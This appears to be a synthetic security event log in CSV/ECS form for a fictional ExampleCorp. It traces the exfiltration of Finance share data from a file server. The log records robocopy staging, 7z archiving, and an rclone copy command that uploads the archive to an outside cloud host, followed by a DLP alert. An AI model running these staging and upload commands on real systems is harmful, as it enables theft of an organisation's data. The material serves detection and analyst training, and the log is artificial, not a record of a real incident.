@timestamp,event.dataset,event.action,host.name,host.ip,user.name,source.ip,destination.ip,destination.port,url.full,process.name,process.command_line,file.path,file.hash.sha256,email.subject,raw,json
2024-11-07T01:17:00Z,endpoint,process_start,SRV-FILE-02,10.10.6.18,filesvc,,,,,robocopy.exe,"robocopy ""D:\Shares\Finance"" ""C:\Temp\stage\Finance"" /MIR /R:1 /W:1",,,,EDR: mass file copy (robocopy /MIR),"{""@timestamp"": ""2024-11-07T01:17:00Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: mass file copy (robocopy /MIR)"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""process"": {""name"": ""robocopy.exe"", ""pid"": 4100, ""parent"": {""name"": ""cmd.exe"", ""pid"": 3000}, ""command_line"": ""robocopy \""D:\\Shares\\Finance\"" \""C:\\Temp\\stage\\Finance\"" /MIR /R:1 /W:1""}}"
2024-11-07T01:17:08Z,network,dns,SRV-FILE-02,10.10.6.18,filesvc,10.10.6.18,,,,,,,,,DNS: query=dl.delivery.mp.microsoft.com answer=13.107.246.70 ttl=300,"{""@timestamp"": ""2024-11-07T01:17:08Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS: query=dl.delivery.mp.microsoft.com answer=13.107.246.70 ttl=300"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""source"": {""ip"": ""10.10.6.18""}, ""dns"": {""question"": {""name"": ""dl.delivery.mp.microsoft.com""}, ""answers"": [{""data"": ""13.107.246.70"", ""ttl"": 300}]}}"
2024-11-07T01:17:12Z,network,flow,SRV-FILE-02,10.10.6.18,filesvc,10.10.6.18,13.107.246.70,443,,,,,,,FLOW: benign TLS traffic,"{""@timestamp"": ""2024-11-07T01:17:12Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""FLOW: benign TLS traffic"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""source"": {""ip"": ""10.10.6.18""}, ""destination"": {""ip"": ""13.107.246.70"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 18788}}"
2024-11-07T01:17:25Z,network,dns,SRV-FILE-02,10.10.6.18,filesvc,10.10.6.18,,,,,,,,,DNS: query=ocsp.digicert.com answer=93.184.220.29 ttl=300,"{""@timestamp"": ""2024-11-07T01:17:25Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS: query=ocsp.digicert.com answer=93.184.220.29 ttl=300"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""source"": {""ip"": ""10.10.6.18""}, ""dns"": {""question"": {""name"": ""ocsp.digicert.com""}, ""answers"": [{""data"": ""93.184.220.29"", ""ttl"": 300}]}}"
2024-11-07T01:17:29Z,network,flow,SRV-FILE-02,10.10.6.18,filesvc,10.10.6.18,93.184.220.29,443,,,,,,,FLOW: benign TLS traffic,"{""@timestamp"": ""2024-11-07T01:17:29Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""FLOW: benign TLS traffic"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""source"": {""ip"": ""10.10.6.18""}, ""destination"": {""ip"": ""93.184.220.29"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 7895}}"
2024-11-07T01:21:00Z,endpoint,process_start,SRV-FILE-02,10.10.6.18,filesvc,,,,,7z.exe,"7z.exe a -tzip ""C:\Temp\finance_Q4.zip"" ""C:\Temp\stage\Finance\*""",,,,EDR: archive creation for staging,"{""@timestamp"": ""2024-11-07T01:21:00Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: archive creation for staging"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""process"": {""name"": ""7z.exe"", ""pid"": 4200, ""parent"": {""name"": ""cmd.exe"", ""pid"": 3000}, ""command_line"": ""7z.exe a -tzip \""C:\\Temp\\finance_Q4.zip\"" \""C:\\Temp\\stage\\Finance\\*\""""}}"
2024-11-07T01:21:30Z,endpoint,file_write,SRV-FILE-02,10.10.6.18,filesvc,,,,,,,C:\Temp\finance_Q4.zip,dc685c3e75dd271eb71b8a154bbe92dd53768885854d0e3046dc6606e0170c53,,FileWrite: finance_Q4.zip size=1.2GB,"{""@timestamp"": ""2024-11-07T01:21:30Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""file_write"", ""kind"": ""event"", ""category"": [""file""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""FileWrite: finance_Q4.zip size=1.2GB"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""file"": {""path"": ""C:\\Temp\\finance_Q4.zip"", ""hash"": {""sha256"": ""dc685c3e75dd271eb71b8a154bbe92dd53768885854d0e3046dc6606e0170c53""}, ""size"": 1200000000}}"
2024-11-07T01:22:00Z,endpoint,file_write,SRV-FILE-02,10.10.6.18,filesvc,,,,,,,C:\Temp\rclone.exe,be83295eb4280e0a229c2a171cf14a2c646e1296285af7c6630c58946079202d,,EDR: suspicious tool dropped (rclone.exe),"{""@timestamp"": ""2024-11-07T01:22:00Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""file_write"", ""kind"": ""event"", ""category"": [""file""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: suspicious tool dropped (rclone.exe)"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""file"": {""path"": ""C:\\Temp\\rclone.exe"", ""hash"": {""sha256"": ""be83295eb4280e0a229c2a171cf14a2c646e1296285af7c6630c58946079202d""}}}"
2024-11-07T01:22:10Z,endpoint,file_write,SRV-FILE-02,10.10.6.18,filesvc,,,,,,,C:\Temp\rclone.conf,2423320bf2be446cae2fd78ce2f8c26ecd9ef356e139133bfbdd394c3ac2a8cd,,FileWrite: rclone config created,"{""@timestamp"": ""2024-11-07T01:22:10Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""file_write"", ""kind"": ""event"", ""category"": [""file""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""FileWrite: rclone config created"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""file"": {""path"": ""C:\\Temp\\rclone.conf"", ""hash"": {""sha256"": ""2423320bf2be446cae2fd78ce2f8c26ecd9ef356e139133bfbdd394c3ac2a8cd""}}}"
2024-11-07T01:22:20Z,endpoint,process_start,SRV-FILE-02,10.10.6.18,filesvc,,,,,rclone.exe,"rclone.exe copy ""C:\Temp\finance_Q4.zip"" remote:backups/finance_Q4.zip --transfers 4 --checkers 8",,,,EDR: rclone data transfer initiated,"{""@timestamp"": ""2024-11-07T01:22:20Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: rclone data transfer initiated"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""process"": {""name"": ""rclone.exe"", ""pid"": 4310, ""parent"": {""name"": ""cmd.exe"", ""pid"": 3000}, ""command_line"": ""rclone.exe copy \""C:\\Temp\\finance_Q4.zip\"" remote:backups/finance_Q4.zip --transfers 4 --checkers 8""}}"
2024-11-07T01:22:25Z,network,dns,SRV-FILE-02,10.10.6.18,filesvc,10.10.6.18,,,,,,,,,DNS query=files-sync-cloud.com answer=82.118.242.99 ttl=60 src=10.10.6.18,"{""@timestamp"": ""2024-11-07T01:22:25Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS query=files-sync-cloud.com answer=82.118.242.99 ttl=60 src=10.10.6.18"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""source"": {""ip"": ""10.10.6.18""}, ""dns"": {""question"": {""name"": ""files-sync-cloud.com""}, ""answers"": [{""data"": ""82.118.242.99"", ""ttl"": 60}]}}"
2024-11-07T01:23:00Z,network,flow,SRV-FILE-02,10.10.6.18,filesvc,10.10.6.18,82.118.242.99,443,,,,,,,TLS upload: large transfer to cloud sync endpoint,"{""@timestamp"": ""2024-11-07T01:23:00Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload: large transfer to cloud sync endpoint"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""source"": {""ip"": ""10.10.6.18""}, ""destination"": {""ip"": ""82.118.242.99"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 18180000}}"
2024-11-07T01:23:18Z,network,flow,SRV-FILE-02,10.10.6.18,filesvc,10.10.6.18,82.118.242.99,443,,,,,,,TLS upload: large transfer to cloud sync endpoint,"{""@timestamp"": ""2024-11-07T01:23:18Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload: large transfer to cloud sync endpoint"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""source"": {""ip"": ""10.10.6.18""}, ""destination"": {""ip"": ""82.118.242.99"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 18180000}}"
2024-11-07T01:23:36Z,network,flow,SRV-FILE-02,10.10.6.18,filesvc,10.10.6.18,82.118.242.99,443,,,,,,,TLS upload: large transfer to cloud sync endpoint,"{""@timestamp"": ""2024-11-07T01:23:36Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload: large transfer to cloud sync endpoint"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""source"": {""ip"": ""10.10.6.18""}, ""destination"": {""ip"": ""82.118.242.99"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 18180000}}"
2024-11-07T01:23:54Z,network,flow,SRV-FILE-02,10.10.6.18,filesvc,10.10.6.18,82.118.242.99,443,,,,,,,TLS upload: large transfer to cloud sync endpoint,"{""@timestamp"": ""2024-11-07T01:23:54Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload: large transfer to cloud sync endpoint"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""source"": {""ip"": ""10.10.6.18""}, ""destination"": {""ip"": ""82.118.242.99"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 18180000}}"
2024-11-07T01:24:00Z,endpoint,alert,SRV-FILE-02,10.10.6.18,filesvc,,,,,,,,,,DLP: Detected bulk upload of Finance data to unsanctioned cloud storage (rclone signature).,"{""@timestamp"": ""2024-11-07T01:24:00Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""alert"", ""kind"": ""event""}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DLP: Detected bulk upload of Finance data to unsanctioned cloud storage (rclone signature)."", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}}"
2024-11-07T01:24:12Z,network,flow,SRV-FILE-02,10.10.6.18,filesvc,10.10.6.18,82.118.242.99,443,,,,,,,TLS upload: large transfer to cloud sync endpoint,"{""@timestamp"": ""2024-11-07T01:24:12Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload: large transfer to cloud sync endpoint"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""source"": {""ip"": ""10.10.6.18""}, ""destination"": {""ip"": ""82.118.242.99"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 18180000}}"
2024-11-07T01:24:30Z,network,flow,SRV-FILE-02,10.10.6.18,filesvc,10.10.6.18,82.118.242.99,443,,,,,,,TLS upload: large transfer to cloud sync endpoint,"{""@timestamp"": ""2024-11-07T01:24:30Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload: large transfer to cloud sync endpoint"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""source"": {""ip"": ""10.10.6.18""}, ""destination"": {""ip"": ""82.118.242.99"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 18180000}}"
2024-11-07T01:24:48Z,network,flow,SRV-FILE-02,10.10.6.18,filesvc,10.10.6.18,82.118.242.99,443,,,,,,,TLS upload: large transfer to cloud sync endpoint,"{""@timestamp"": ""2024-11-07T01:24:48Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload: large transfer to cloud sync endpoint"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""source"": {""ip"": ""10.10.6.18""}, ""destination"": {""ip"": ""82.118.242.99"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 18180000}}"
2024-11-07T01:25:00Z,terminal,command,SRV-FILE-02,10.10.6.18,filesvc,,,,,,,,,,"2024-11-07T01:25:00Z filesvc@SRV-FILE-02$ net session
(output truncated)","{""@timestamp"": ""2024-11-07T01:25:00Z"", ""event"": {""dataset"": ""terminal"", ""action"": ""command"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""2024-11-07T01:25:00Z filesvc@SRV-FILE-02$ net session\n(output truncated)"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""terminal"": {""command"": ""net session"", ""output"": ""(output truncated)""}}"
2024-11-07T01:25:06Z,network,flow,SRV-FILE-02,10.10.6.18,filesvc,10.10.6.18,82.118.242.99,443,,,,,,,TLS upload: large transfer to cloud sync endpoint,"{""@timestamp"": ""2024-11-07T01:25:06Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload: large transfer to cloud sync endpoint"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""source"": {""ip"": ""10.10.6.18""}, ""destination"": {""ip"": ""82.118.242.99"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 18180000}}"
2024-11-07T01:25:24Z,network,flow,SRV-FILE-02,10.10.6.18,filesvc,10.10.6.18,82.118.242.99,443,,,,,,,TLS upload: large transfer to cloud sync endpoint,"{""@timestamp"": ""2024-11-07T01:25:24Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload: large transfer to cloud sync endpoint"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""source"": {""ip"": ""10.10.6.18""}, ""destination"": {""ip"": ""82.118.242.99"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 18180000}}"
2024-11-07T01:25:42Z,network,flow,SRV-FILE-02,10.10.6.18,filesvc,10.10.6.18,82.118.242.99,443,,,,,,,TLS upload: large transfer to cloud sync endpoint,"{""@timestamp"": ""2024-11-07T01:25:42Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload: large transfer to cloud sync endpoint"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""source"": {""ip"": ""10.10.6.18""}, ""destination"": {""ip"": ""82.118.242.99"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 18180000}}"
2024-11-07T01:26:00Z,network,flow,SRV-FILE-02,10.10.6.18,filesvc,10.10.6.18,82.118.242.99,443,,,,,,,TLS upload: large transfer to cloud sync endpoint,"{""@timestamp"": ""2024-11-07T01:26:00Z"", ""event"": {""dataset"": ""network"", ""action"": ""flow"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""TLS upload: large transfer to cloud sync endpoint"", ""host"": {""name"": ""SRV-FILE-02"", ""ip"": [""10.10.6.18""]}, ""user"": {""name"": ""filesvc"", ""email"": null}, ""source"": {""ip"": ""10.10.6.18""}, ""destination"": {""ip"": ""82.118.242.99"", ""port"": 443}, ""network"": {""transport"": ""tcp"", ""bytes"": 18180000}}"
